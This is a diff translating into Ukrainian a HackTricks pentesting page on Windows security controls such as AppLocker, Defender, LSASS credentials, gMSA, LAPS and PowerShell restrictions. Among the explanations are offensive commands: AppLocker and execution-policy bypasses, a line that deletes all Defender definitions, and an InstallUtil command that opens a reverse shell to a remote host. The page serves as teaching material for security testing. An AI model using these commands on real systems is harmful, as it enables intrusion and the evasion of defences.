@@ -1,37 +1,36 @@
-# Windows Security Controls
+# Контролі безпеки Windows
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
 
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) для легкої побудови та **автоматизації робочих процесів** за допомогою найбільш **продвинутих інструментів спільноти** у світі.\
+Отримайте доступ сьогодні:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## AppLocker Policy
+## Політика AppLocker
 
-An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
+Білий список програм - це список схвалених програм або виконуваних файлів, які дозволяється присутнім та запускатися на системі. Мета полягає в захисті середовища від шкідливих програм-шпигунів та недозволених програм, які не відповідають конкретним бізнес-потребам організації.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) - це **рішення для створення білого списку програм** від Microsoft, яке дає адміністраторам систем контроль над **програмами та файлами, які можуть виконувати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами установки Windows, DLL-бібліотеками, упакованими програмами та програмами для установки упакованих програм.\
+Зазвичай організації **блокують cmd.exe та PowerShell.exe** та доступ на запис до певних каталогів, **але все це можна обійти**.
 
-### Check
+### Перевірка
 
-Check which files/extensions are blacklisted/whitelisted:
-
+Перевірте, які файли/розширення перебувають у чорному/білому списку:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -40,63 +39,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
+Цей шлях реєстру містить конфігурації та політики, які застосовуються AppLocker, надаючи можливість переглянути поточний набір правил, які діють в системі:
 
 * `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
-### Bypass
+### Обхід
 
-* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
-
+* Корисні **Папки для запису**, щоб обійти політику AppLocker: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, є **папки для запису**, які можна використовувати для **обходу цього**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
+* Зазвичай **довіряються** [**"LOLBAS's"**](https://lolbas-project.github.io/) бінарні файли також можуть бути корисними для обхіду AppLocker.
+* **Погано написані правила також можуть бути обхідними**
+* Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, ви можете створити **папку з назвою `allowed`** де завгодно, і вона буде дозволена.
+* Організації часто фокусуються на **блокуванні виконування виконуваних файлів `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
+* **Завантаження DLL майже ніколи не увімкнене** через додаткове навантаження на систему та кількість тестувань, необхідних для забезпечення того, що нічого не зламається. Таким чином, використання **DLL як задніх дверей допоможе обійти AppLocker**.
+* Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) для **виконання коду Powershell** в будь-якому процесі та обходу AppLocker. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
-* **Poorly written rules could also be bypassed**
-  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
-* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Зберігання облікових даних
 
-## Credentials Storage
+### Менеджер облікових записів безпеки (SAM)
 
-### Security Accounts Manager (SAM)
+Локальні облікові дані присутні в цьому файлі, паролі захешовані.
 
-Local credentials are present in this file, the passwords are hashed.
+### Локальна служба безпеки (LSA) - LSASS
 
-### Local Security Authority (LSA) - LSASS
+**Облікові дані** (захешовані) **зберігаються** в **пам'яті** цієї підсистеми з метою одноразового входу.\
+**LSA** керує локальною **політикою безпеки** (політика паролів, дозволи користувачів...), **аутентифікацією**, **токенами доступу**...\
+LSA буде перевіряти надані облікові дані всередині файлу **SAM** (для локального входу) та **спілкуватися** з **контролером домену** для аутентифікації користувача домену.
 
-The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
-**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
-LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
+**Облікові дані** зберігаються всередині **процесу LSASS**: квитки Kerberos, хеші NT та LM, легко розшифровані паролі.
 
-The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
+### Секрети LSA
 
-### LSA secrets
+LSA може зберігати на диску деякі облікові дані:
 
-LSA could save in disk some credentials:
-
-* Password of the computer account of the Active Directory (unreachable domain controller).
-* Passwords of the accounts of Windows services
-* Passwords for scheduled tasks
-* More (password of IIS applications...)
+* Пароль облікового запису комп'ютера Active Directory (недосяжний контролер домену).
+* Паролі облікових записів служб Windows
+* Паролі для запланованих завдань
+* Ще (пароль додатків IIS...)
 
 ### NTDS.dit
 
-It is the database of the Active Directory. It is only present in Domain Controllers.
+Це база даних Active Directory. Вона присутня лише на контролерах домену.
 
-## Defender
+## Захисник
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) - це антивірус, який доступний в Windows 10 та Windows 11, а також у версіях Windows Server. Він **блокує** загальні інструменти для пентестінгу, такі як **`WinPEAS`**. Однак існують способи **обхіду цих захистів**.
 
-### Check
+### Перевірка
 
-To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
+Для перевірки **стану** **Захисника** ви можете виконати PS-команду **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -115,8 +111,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-To enumerate it you could also run:
-
+Для переліку ви також можете виконати:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -125,69 +120,62 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+## Зашифрована файлова система (EFS)
 
-## Encrypted File System (EFS)
+EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ** під назвою **Ключ шифрування файлів (FEK)**. Цей ключ зашифрований за допомогою **публічного ключа** користувача та зберігається у **альтернативному потоці даних** $EFS зашифрованого файлу. При необхідності розшифрування, використовується відповідний **приватний ключ** цифрового сертифіката користувача для розшифрування FEK з потоку $EFS. Додаткові деталі можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
+**Сценарії розшифрування без ініціації користувача** включають:
 
-**Decryption scenarios without user initiation** include:
+* Коли файли або папки переміщуються на не-EFS файлову систему, наприклад, [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), вони автоматично розшифровуються.
+* Зашифровані файли, відправлені через мережу за протоколом SMB/CIFS, розшифровуються перед передачею.
 
-* When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), they are automatically decrypted.
-* Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
+Цей метод шифрування дозволяє **прозорий доступ** до зашифрованих файлів для власника. Однак просто зміна пароля власника та вхід в систему не дозволить розшифрування.
 
-This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
+**Основні висновки**:
 
-**Key Takeaways**:
+* EFS використовує симетричний FEK, зашифрований за допомогою публічного ключа користувача.
+* Розшифрування використовує приватний ключ користувача для доступу до FEK.
+* Автоматичне розшифрування відбувається в певних умовах, наприклад, при копіюванні на FAT32 або передачі через мережу.
+* Зашифровані файли доступні власнику без додаткових кроків.
 
-* EFS uses a symmetric FEK, encrypted with the user's public key.
-* Decryption employs the user's private key to access the FEK.
-* Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
-* Encrypted files are accessible to the owner without additional steps.
+### Перевірка інформації EFS
 
-### Check EFS info
+Перевірте, чи **користувач** **використовував** цей **сервіс**, перевіривши, чи існує цей шлях: `C:\users\<ім'я_користувача>\appdata\roaming\Microsoft\Protect`
 
-Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Перевірте, **хто** має **доступ** до файлу, використовуючи `cipher /c \<файл>\`
+Ви також можете використовувати `cipher /e` та `cipher /d` всередині папки для **шифрування** та **розшифрування** всіх файлів
 
-Check **who** has **access** to the file using cipher /c \<file>\
-You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
+### Розшифрування файлів EFS
 
-### Decrypting EFS files
+#### Бути системою авторитету
 
-#### Being Authority System
+Для цього способу **користувач жертва** повинен **виконувати** процес всередині хоста. У цьому випадку, використовуючи сесії `meterpreter`, ви можете підробити токен процесу користувача (`impersonate_token` з `incognito`). Або ви можете просто `migrate` до процесу користувача.
 
-This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.
-
-#### Knowing the users password
+#### Знання пароля користувача
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
-## Group Managed Service Accounts (gMSA)
+## Керовані групові облікові записи служб (gMSA)
 
-Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:
+Microsoft розробив **Керовані групові облікові записи служб (gMSA)** для спрощення управління обліковими записами служб в ІТ-інфраструктурах. На відміну від традиційних облікових записів служб, у яких часто включена налаштування "**Пароль ніколи не закінчується**", gMSA пропонують більш безпечне та кероване рішення:
 
-* **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
-* **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
-* **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
-* **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
-* **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
+* **Автоматичне управління паролями**: gMSA використовують складний пароль у 240 символів, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється Службою розподілу ключів Microsoft (KDC), що усуває необхідність вручних оновлень пароля.
+* **Підвищене забезпечення**: Ці облікові записи не піддаються блокуванню та не можуть бути використані для інтерактивних входів, підвищуючи їх безпеку.
+* **Підтримка кількох хостів**: gMSA можуть бути використані на кількох хостах, що робить їх ідеальними для служб, які працюють на кількох серверах.
+* **Можливість запланованих завдань**: На відміну від керованих облікових записів служб, gMSA підтримують запуск запланованих завдань.
+* **Спрощене управління SPN**: Система автоматично оновлює ім'я службового принципалу (SPN), коли відбуваються зміни в деталях sAMaccount комп'ютера або DNS-імені, спрощуючи управління SPN.
 
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
-
-![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
-
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
+Паролі для gMSA зберігаються в властивості LDAP _**msDS-ManagedPassword**_ та автоматично скидаються кожні 30 днів контролерами доменів (DC). Цей пароль, зашифрований блок даних, відомий як [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), може бути отриманий лише авторизованими адміністраторами та серверами, на яких встановлені gMSA, забезпечуючи безпечне середовище. Для доступу до цієї інформації потрібне захищене підключення, таке як LDAPS, або підключення повинно бути аутентифіковане за допомогою 'Sealing & Secure'.
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+[**Дізнайтеся більше інформації у цьому пості**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Також перевірте цю [веб-сторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати атаку **пересилання NTLM** для **читання** **пароля** **gMSA**.
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+**Рішення для локального адміністраторського пароля (LAPS)**, доступне для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дозволяє керувати паролями локальних адміністраторів. Ці паролі, які є **випадковими**, унікальними та **регулярно змінюються**, зберігаються централізовано в Active Directory. Доступ до цих паролів обмежений через ACL для авторизованих користувачів. З достатніми наданими дозволами надається можливість читання паролів локальних адміністраторів.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -195,43 +183,34 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+PowerShell [**Обмежений режим мови**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, таких як блокування об'єктів COM, дозвіл лише схвалених типів .NET, робочі процеси на основі XAML, класи PowerShell та інше.
 
-### **Check**
-
+### **Перевірка**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
-
-### Bypass
-
+### Обхід
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+У поточній версії Windows цей обхід не працюватиме, але ви можете скористатися [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
+**Для компіляції можливо знадобиться** **додати посилання** -> _Перегляд_ -> _Перегляд_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проект на .Net4.5**.
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+#### Прямий обхід:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-
-#### Reverse shell:
-
+#### Зворотній шел:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) для **виконання коду Powershell** в будь-якому процесі та обхіду обмеженого режиму. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Політика виконання PS
 
-## PS Execution Policy
-
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+За замовчуванням вона встановлена на **обмежена.** Основні способи обхіду цієї політики:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -251,33 +230,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
+Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+## Інтерфейс постачальника підтримки безпеки (SSPI)
 
-## Security Support Provider Interface (SSPI)
+Це API, яке можна використовувати для аутентифікації користувачів.
 
-Is the API that can be use to authenticate users.
+SSPI буде відповідальним за знаходження відповідного протоколу для двох машин, які хочуть спілкуватися. Найбажаніший метод для цього - Kerberos. Потім SSPI буде вести переговори про те, який протокол аутентифікації буде використовуватися; ці протоколи аутентифікації називаються постачальниками підтримки безпеки (SSP), вони розташовані у кожній машині з Windows у вигляді DLL, і обидві машини повинні підтримувати однакові, щоб мати можливість спілкуватися.
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+### Основні постачальники підтримки безпеки (SSP)
 
-### Main SSPs
+* **Kerberos**: Найбажаніший
+* %windir%\Windows\System32\kerberos.dll
+* **NTLMv1** та **NTLMv2**: З причин сумісності
+* %windir%\Windows\System32\msv1\_0.dll
+* **Digest**: Веб-сервери та LDAP, пароль у вигляді хешу MD5
+* %windir%\Windows\System32\Wdigest.dll
+* **Schannel**: SSL та TLS
+* %windir%\Windows\System32\Schannel.dll
+* **Negotiate**: Використовується для переговорів щодо протоколу, який слід використовувати (Kerberos або NTLM, за замовчуванням Kerberos)
+* %windir%\Windows\System32\lsasrv.dll
 
-* **Kerberos**: The preferred one
-  * %windir%\Windows\System32\kerberos.dll
-* **NTLMv1** and **NTLMv2**: Compatibility reasons
-  * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  * %windir%\Windows\System32\Wdigest.dll
-* **Schannel**: SSL and TLS
-  * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  * %windir%\Windows\System32\lsasrv.dll
+#### Під час переговорів може бути запропоновано кілька методів або лише один.
 
-#### The negotiation could offer several methods or only one.
+## UAC - Контроль облікових записів користувачів
 
-## UAC - User Account Control
-
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - це функція, яка дозволяє **запит на підтвердження для підвищених дій**.
 
 {% content-ref url="windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
@@ -286,8 +264,8 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси** за допомогою найбільш **продвинутих** інструментів спільноти у світі.\
+Отримайте доступ сьогодні:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -295,14 +273,14 @@ Get Access Today:
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити свою **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
 
 </details>
